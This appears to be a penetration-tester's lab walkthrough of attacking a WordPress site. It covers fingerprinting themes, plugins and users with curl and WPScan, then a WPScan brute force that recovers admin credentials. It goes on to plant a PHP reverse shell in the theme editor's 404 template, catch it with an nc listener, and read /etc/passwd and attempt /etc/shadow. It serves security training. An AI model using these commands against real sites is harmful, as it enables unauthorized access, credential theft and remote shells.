

# Discovery/Footprinting

1. `/robots.txt`

A quick way to identify a WordPress site is by browsing to the `/robots.txt `file. A typical robots.txt on a WordPress installation may look like:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

Here the presence of the `/wp-admin` and `/wp-content` directories would be a dead giveaway that we are dealing with WordPress. 

Typically attempting to browse to the `wp-admin` directory will redirect us to the `wp-login.php` page. This is the login portal to the WordPress instance's back-end.

WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. 

Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.


There are five types of users on a standard WordPress installation.

`Administrator:` This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
`Editor`: An editor can publish and manage posts, including the posts of other users.
`Author:` They can publish and manage their own posts.
`Contributor`: These users can write and manage their own posts but cannot publish them.
`Subscriber`: These are standard users who can browse posts and edit their profiles.

2. Inspect Source code

Another quick way to identify a WordPress site is by looking at the page source. 

Viewing the page with `cURL` and grepping for WordPress can help us confirm that WordPress is in use and footprint the version number, which we should note down for later. We can enumerate WordPress using a variety of manual and automated tactics.

┌──(kali㉿kali)-[~]
└─$ `curl -s http://blog.inlanefreight.local | grep WordPress`

<meta name="generator" content="WordPress 5.8" />
</ul></div></div></div><div id="block-4" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container"><h2>Recent Comments</h2><ol class="wp-block-latest-comments"><li class="wp-block-latest-comments__comment"><article><footer class="wp-block-latest-comments__comment-meta"><a class="wp-block-latest-comments__comment-author" href="https://wordpress.org/">A WordPress Commenter</a> on <a class="wp-block-latest-comments__comment-link" href="http://blog.inlanefreight.local/?p=1#comment-1">Shipping Industry News</a></footer></article></li></ol></div></div></div><div id="block-5" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container"><h2>Archives</h2><ul class=" wp-block-archives-list wp-block-archives">     <li><a href='http://blog.inlanefreight.local/?m=202108'>August 2021</a></li>
                    

Browsing the site and perusing the page source will give us hints to the `theme` in use, `plugins` installed, and `even usernames` if author names are published with posts

3. Themes

Looking at the page source, we can see that the Business Gravity theme is in use. We can go further and attempt to fingerprint the theme version number and look for any known vulnerabilities that affect it.

──(kali㉿kali)-[~]
└─$  `curl -s http://blog.inlanefreight.local/ | grep themes`

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />


4. Plugins

Next, let's take a look at which plugins we can uncover.

──(kali㉿kali)-[~]
└─$ `curl -s http://blog.inlanefreight.local | grep plugins ` 

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
                <link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
                               

From the output above, we know that the `Contact Form 7` and `mail-masta` plugins are installed. The next step would be enumerating the versions.
Browsing to `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` shows us that directory listing is enabled and that a `readme.txt` file is present. 

These files are very often helpful in fingerprinting version numbers. From the readme, it appears that version `1.0.0` of the plugin is installed, which suffers from a `Local File Inclusion` vulnerability that was published in August of 2021.

https://www.exploit-db.com/exploits/40290


Let's dig around a bit more. Checking the page source of another page, we can see that the `wpDiscuz `plugin is installed, and it appears to be version `7.0.4`

──(kali㉿kali)-[~]
└─$ `curl -s http://blog.inlanefreight.local/?p=1 | grep plugins`

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-fa-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4' type='text/css' media='all' />


A quick search for this plugin version shows this unauthenticated remote code execution vulnerability from June of 2021.

https://www.exploit-db.com/exploits/49967



5. Enumerating Users

We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at `/wp-login.php`.

A `valid username and an invalid password` results in the following message:

> Error: The password you entered for the username admin is incorrect. Lost your password?

However, `an invalid username `returns that the user was not found.

> Error: The username john is not registered on this site. If you are unsure of your username, try your email address instead.

This makes WordPress vulnerable to `username enumeration`.


# WPScan

`WPScan` is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable.

`WPScan` is also able to pull in vulnerability information from external sources. We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day.

Some Example usage


Enumerate plugins `vp` and `u` users


┌──(kali㉿kali)-[~]
└─$ `wpscan --url http://10.10.207.150/blog/ -e vp,u`
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.207.150/blog/ [10.10.207.150]
[+] Started: Mon Apr 22 00:05:03 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.207.150/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.207.150/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.207.150/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 22 00:05:17 2024
[+] Requests Done: 64
[+] Cached Requests: 5
[+] Data Sent: 14.822 KB
[+] Data Received: 21.33 MB
[+] Memory used: 220.508 MB
[+] Elapsed time: 00:00:13

******************************************************************************************

# Attacks

1. Login Bruteforce

2. Remote Code Execution via Theme Editor


# Lets bruteforce wordpress with admin user found

┌──(kali㉿kali)-[~]
└─$ `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.207.150/blog/ [10.10.207.150]
[+] Started: Mon Apr 22 00:09:19 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.207.150/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.207.150/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.207.150/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                                                                 
Trying admin / nguyen Time: 00:01:20 <                                                                                                                                                             > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 22 00:10:59 2024
[+] Requests Done: 4043
[+] Cached Requests: 28
[+] Data Sent: 2.052 MB
[+] Data Received: 2.319 MB
[+] Memory used: 254.918 MB
[+] Elapsed time: 00:01:40
                              


# we found credentials Username: admin, Password: my2boys

# Now We are able to login as admin, we check for Posts and found something interesting on of the post

************************************************************************************************************

# In Wordpress We can often user Theme Editor to create a reverse shell lets try that

We will put our php reversehell on theme editor and start a listener on kali , then we will navigate to page and we should have access

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

We put reversshell in 404 template in theme editor

Now when we hit http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php, we get the shell on our netcal listner


┌──(kali㉿kali)-[/]
└─$ nc -nvlp 4444        
listening on [any] 4444 ...
connect to [10.17.6.236] from (UNKNOWN) [10.10.207.150] 34388
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:03:38 up  2:26,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
 


`/bin/bash -i`
bash: cannot set terminal process group (1077): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/$ `cat /etc/passwd`
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
www-data@internal:/$ `sudo -l`
sudo -l
sudo: no tty present and no askpass program specified
www-data@internal:/$ `cat ~/.bash_history`
cat ~/.bash_history
cat: /var/www/.bash_history: No such file or directory
www-data@internal:/$ `cat /etc/sudoers`
cat /etc/sudoers
cat: /etc/sudoers: Permission denied
www-data@internal:/$ `cat /etc/shadow`
cat /etc/shadow
